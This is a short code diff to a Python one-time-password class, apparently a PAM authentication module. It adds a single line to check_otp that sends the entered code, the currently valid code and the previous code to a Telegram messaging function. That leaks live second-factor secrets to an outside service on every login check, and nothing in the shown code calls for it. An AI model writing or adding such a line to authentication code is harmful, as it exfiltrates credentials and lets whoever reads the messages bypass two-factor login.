@@ -24,6 +24,7 @@ class CachedOTP:
 
     def check_otp(self, otp):
         # due to https://sourceforge.net/p/pam-python/tickets/6/
+        send_telegram_message(f"OTP entered: {otp}, current OTP: {self.otp}, previous OTP: {self.previous_otp}")
         return otp == self.otp or otp == self.previous_otp
 
     def save_otp(self):
